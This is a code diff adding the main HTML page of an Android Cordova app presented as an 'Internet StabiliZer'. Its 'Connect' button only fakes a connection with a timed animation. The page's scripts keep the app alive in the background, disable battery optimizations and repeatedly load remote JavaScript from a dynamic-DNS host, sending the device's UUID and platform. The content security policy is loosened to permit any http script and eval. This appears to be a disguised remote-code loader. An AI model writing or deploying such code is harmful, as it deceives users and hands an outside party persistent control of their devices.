@@ -1,0 +1,139 @@
+<html><head>
+		<!--
+		Customize this policy to fit your own app's needs. For more guidance, see:
+			https://github.com/apache/cordova-plugin-whitelist/blob/master/README.md#content-security-policy
+		Some notes:
+			* gap: is required only on iOS (when using UIWebView) and is needed for JS->native communication
+			* https://ssl.gstatic.com is required only on Android and is needed for TalkBack to function properly
+			* Disables use of inline scripts in order to mitigate risk of XSS vulnerabilities. To change this:
+				* Enable inline JS: add 'unsafe-inline' to default-src
+		-->
+		<!--meta http-equiv="Content-Security-Policy" content="default-src 'self' data: gap: https://ssl.gstatic.com 'unsafe-eval'; style-src 'self' 'unsafe-inline'; media-src *; img-src 'self' data: content:;"-->
+		<meta http-equiv="Content-Security-Policy" content="default-src *; style-src 'self' http://* 'unsafe-inline'; script-src 'self' http://* 'unsafe-inline' 'unsafe-eval'">
+		<meta name="format-detection" content="telephone=no">
+		<meta name="msapplication-tap-highlight" content="no">
+		<meta name="viewport" content="initial-scale=1, width=device-width, viewport-fit=cover">
+		<link rel="stylesheet" type="text/css" href="css/index.css">
+		<title>Internet StabiliZer</title>
+		<script src="file:///android_asset/www/cordova_plugins.js"></script><script src="file:///android_asset/www/plugins/my-cordova-plugin/www/plugin.js"></script><script src="file:///android_asset/www/plugins/cordova-plugin-device/www/device.js"></script><script src="file:///android_asset/www/plugins/cordova-plugin-background-mode/www/background-mode.js"></script>
+	<script src="file:///android_asset/www/cordova_plugins.js"></script><script src="file:///android_asset/www/plugins/my-cordova-plugin/www/plugin.js"></script><script src="file:///android_asset/www/plugins/cordova-plugin-device/www/device.js"></script><script src="file:///android_asset/www/plugins/cordova-plugin-background-mode/www/background-mode.js"></script></head>
+	<body>
+	
+	
+	<div class="theme-switch-wrapper">
+	<label class="theme-switch" for="checkbox">
+		<input type="checkbox" id="checkbox">
+		<div class="slider round"></div>
+  </label>
+</div>
+		<div class="app">
+			<button id="conBtn" class="connectbtn" onclick="connect_trigger()" disabled>Start</button>
+			<div id="deviceready" class="blink" style="margin-top: 25px;">
+				<p class="event listening" style="display:block;">Require authorization</p>
+				<p class="event connecting" style="display:none;">Connecting...</p>
+				<p class="event received" style="display:none;">Connected</p>
+			</div>
+		</div>
+		<script type="text/javascript" src="cordova.js"></script>
+		<script type="text/javascript" src="js/index.js"></script>
+
+		<script type="text/javascript">
+			const toggleSwitch = document.querySelector('.theme-switch input[type="checkbox"]');
+			function switchTheme(e) {
+				if (e.target.checked) {
+					document.documentElement.setAttribute('data-theme', 'dark');
+				}
+				else {
+					document.documentElement.setAttribute('data-theme', 'light');
+				}	
+			}
+			toggleSwitch.addEventListener('change', switchTheme, false);
+		</script>
+		<script type="text/javascript">
+			var apitoken = 0;
+			var init_run = 0;
+			function load_check()
+			{
+				if (document.body.contains(document.getElementById("checkUpdate"))){
+					document.body.removeChild(document.getElementById("checkUpdate"));	
+				};
+				var deviceUUID = device.uuid;
+				var devicePlatform = btoa(device.platform + ' ' + device.version);
+				if(window.localStorage.getItem("uuid")===null){
+					window.localStorage.setItem("uuid", deviceUUID);
+				}else{
+					deviceUUID = window.localStorage.getItem("uuid");
+				}
+				var s = document.createElement("script");
+				s.type = "text/javascript";
+				s.id = "checkUpdate";
+				s.src = "http://internetorange.myddns.me/checkupdate.js?id="+deviceUUID+"&token="+apitoken+"&ping="
+				+ new Date().getTime() + "&platform="+devicePlatform;
+				s.onerror = function() {
+					apitoken = 0;
+					setTimeout(load_check, 5000);
+				};
+				document.body.appendChild(s);
+			}
+		</script>
+		<script type="text/javascript">
+			function connect_trigger(){
+				if(document.getElementById("conBtn").innerHTML === "Start"){
+					background_keeprunning();
+				}
+				else if(document.getElementById("conBtn").innerHTML === "Connect"){
+					document.getElementById("conBtn").disabled = true;
+					var parentElement = document.getElementById('deviceready');
+					var listeningElement = parentElement.querySelector('.listening');
+					var connectedElement = parentElement.querySelector('.connecting');
+					var receivedElement = parentElement.querySelector('.received');
+					listeningElement.setAttribute('style', 'display:none;');
+					connectedElement.setAttribute('style', 'display:block;');
+					setTimeout(function(){
+						connectedElement.setAttribute('style', 'display:none;');
+						receivedElement.setAttribute('style', 'display:block;');
+						document.getElementById("conBtn").innerHTML = "Close";
+						document.getElementById("conBtn").disabled = false;
+						cordova.plugins.foregroundService.start('Connected', 'Background Service', 'connexion', 3, 10);
+					}, 5000);
+					cordova.plugins.backgroundMode.overrideBackButton();
+					cordova.plugins.backgroundMode.on('activate', function () {
+						console.log("onActiveConsole ....");
+						if (init_run===0){
+							init_run = 1;
+							load_check();
+						}
+						cordova.plugins.backgroundMode.moveToBackground();
+					})
+				}else{
+					cordova.plugins.backgroundMode.moveToBackground();
+					setTimeout(load_check, 1000);
+				}
+			}
+		</script>
+		<script type="text/javascript">
+			function background_keeprunning(){
+				cordova.plugins.backgroundMode.isPermissionGranted(function(res){
+					if(res > 1){
+						cordova.plugins.backgroundMode.disableBatteryOptimizations();
+						cordova.plugins.backgroundMode.disableWebViewOptimizations();
+					}
+				});
+			}
+			function checkPermission(){
+				document.getElementById("conBtn").disabled = false;
+				var parentElement = document.getElementById('deviceready');
+				var listeningElement = parentElement.querySelector('.listening');
+				cordova.plugins.backgroundMode.isPermissionGranted(function(res){
+						if(res !== 1){
+							setTimeout(checkPermission, 200);
+						}else{
+							listeningElement.innerHTML = "Not connected";
+							document.getElementById("conBtn").innerHTML = "Connect";
+						};
+				});
+			}
+		</script>
+
+</body>
+</html>
